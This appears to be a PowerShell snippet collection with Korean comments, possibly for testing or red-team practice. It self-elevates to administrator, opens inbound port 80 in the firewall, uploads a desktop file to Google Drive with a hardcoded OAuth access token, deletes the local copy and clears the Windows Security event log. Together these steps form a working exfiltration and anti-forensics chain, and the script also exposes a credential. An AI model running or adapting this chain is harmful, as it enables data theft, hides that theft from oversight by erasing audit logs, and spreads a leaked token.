# elevate-self.ps1 (스니펫)
$curr = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($curr)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
  $psi = New-Object System.Diagnostics.ProcessStartInfo "powershell"
  $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
  $psi.Verb = "runas"
  try { [Diagnostics.Process]::Start($psi) | Out-Null } catch { throw "관리자 권한 상승이 취소됨." }
  exit
}
# TCP port
New-NetFirewallRule -DisplayName "ALLOW TCP PORT 80" -Direction inbound -Profile Any -Action Allow -LocalPort 80 -Protocol TCP

#버전확인
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsBuildNumber

#파일 저장 후 삭제
# Upload-LocalFileToDrive.ps1
# 로컬 파일을 Google Drive API v3로 업로드 (multipart 방식, ≤5MB)
# Access Token은 코드 내부에 하드코딩됨.

$username = $env:USERNAME

# === 설정 영역 ===
$AccessToken = "ya29.A0AS3H6NxpIZ0wxnNpEmc8M2mJBMOxUFgrxsMBJvyYzSc66vthkQZg9VO_1QfY5hCE8Ho-EK8ihSVFIuNk-OcnghZ0a-LQICR1Yr315Dpu1_dmB4TJXzZgKaokW-icBVnRB7Z8nBoPx_QwcwegJFNU9PLdbLRtJy8_16ZWHb8H3KI1NwduXejJE5TjEnlI5B754wMSBgEaCgYKAXMSARYSFQHGX2MipvNWk_hK-7DMEi2fKJeJ_Q0206"   # OAuth Playground에서 발급받은 Access Token (ya29로 시작)
$LocalFilePath = "C:\Users\$env:USERNAME\Desktop\TEST2\report.txt"   # 업로드할 로컬 파일
$DriveFileName = "report.txt"                                       # 구글 드라이브에 저장될 이름
$DriveParentFolderId = ""                                           # 업로드할 폴더 ID (없으면 루트)


# === 업로드 로직 ===
if (-not (Test-Path $LocalFilePath)) {
    throw "로컬 파일을 찾을 수 없습니다: $LocalFilePath"
}

# 메타데이터
$meta = @{ name = $DriveFileName }
if ($DriveParentFolderId -ne "") { $meta.parents = @($DriveParentFolderId) }
$metaJson = $meta | ConvertTo-Json -Depth 5

# 파일 바이트
$fileBytes = [IO.File]::ReadAllBytes($LocalFilePath)

# multipart body
$boundary = "====" + [guid]::NewGuid().ToString("N") + "===="
$nl = "`r`n"
$part1 = "--$boundary$nl" +
         "Content-Type: application/json; charset=UTF-8$nl$nl" +
         $metaJson + $nl +
         "--$boundary$nl" +
         "Content-Type: application/octet-stream$nl$nl"
$part3 = "$nl--$boundary--$nl"

$bodyStream = New-Object System.IO.MemoryStream
$writer = New-Object System.IO.BinaryWriter($bodyStream)
$writer.Write([System.Text.Encoding]::UTF8.GetBytes($part1))
$writer.Write($fileBytes)
$writer.Write([System.Text.Encoding]::UTF8.GetBytes($part3))
$writer.Flush()
$bodyBytes = $bodyStream.ToArray()
$writer.Dispose()
$bodyStream.Dispose()

# API 호출
$uri = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&fields=id,name,webViewLink"
$headers = @{
  "Authorization" = "Bearer $AccessToken"
  "Content-Type"  = "multipart/related; boundary=$boundary"
}

Write-Host "구글 드라이브로 업로드 중..."
$response = Invoke-RestMethod -Method Post -Uri $uri -Headers $headers -Body $bodyBytes

if ($response.id) {
    Write-Host "업로드 완료:"
    Write-Host "  ID          : $($response.id)"
    Write-Host "  Name        : $($response.name)"
    Write-Host "  WebViewLink : $($response.webViewLink)"
} else {
    Write-Host "응답:"
    $response | ConvertTo-Json -Depth 5
}


#파일 삭제
# report.txt 파일 삭제
Remove-Item -Path "C:\Users\user\Desktop\TEST2\report.txt"


#로그삭제
Clear-EventLog -LogName Security